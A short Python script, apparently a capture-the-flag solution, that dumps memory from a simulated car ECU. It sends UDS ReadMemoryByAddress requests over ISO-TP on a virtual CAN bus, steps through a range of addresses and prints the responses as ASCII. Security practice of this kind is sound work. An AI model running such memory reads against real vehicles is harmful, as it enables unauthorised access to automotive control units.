import subprocess
import time

SENDER_CANID = "7E0"
RECEIVER_CANID = "7E8"
interface = "vcan0"

def send_packet(input_bytes_int: list[int]):
    input_bytes_str = [(hex(by)[2:]).zfill(2) for by in input_bytes_int]
    input_data = " ".join(input_bytes_str)
    
    # subprocess.callで標準入力を渡す
    subprocess.run(['isotpsend', '-s', SENDER_CANID, '-d', RECEIVER_CANID, interface], input=input_data.encode())

def create_background_recv_process():
    return subprocess.Popen(
        ['isotprecv', '-s', SENDER_CANID, '-d', RECEIVER_CANID, interface],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    
def hex_to_ascii(hex_string):
    # 16進数文字列をスペースで分割してリストにする
    hex_values = hex_string.split()
    
    # 16進数リストをアスキー文字列に変換
    ascii_string = ''.join([chr(int(h, 16)) for h in hex_values])
    
    return ascii_string.encode("utf-8")

if __name__ == "__main__":
    
    process = create_background_recv_process()
    time.sleep(0.5)
    
    # ISO TP
    for i in range(0x00, 0xF):
        time.sleep(0.5)
        
        packet = [0x23, 0x14, 0xC0, 0xff, 0xe0 + i, 0x00, 0xFF]

        send_packet(packet)

        if process.poll() is not None:
            stdout, stderr = process.communicate()
            
            msg = stdout.decode("utf-8")
            
            response_msg = msg.split("\n")[0].strip()
            process = create_background_recv_process()
            time.sleep(0.1)
            
            target_msg = hex_to_ascii(response_msg[3:]).decode("utf-8")
            # if "flag" in target_msg:
            print(target_msg)
            
            


            
        












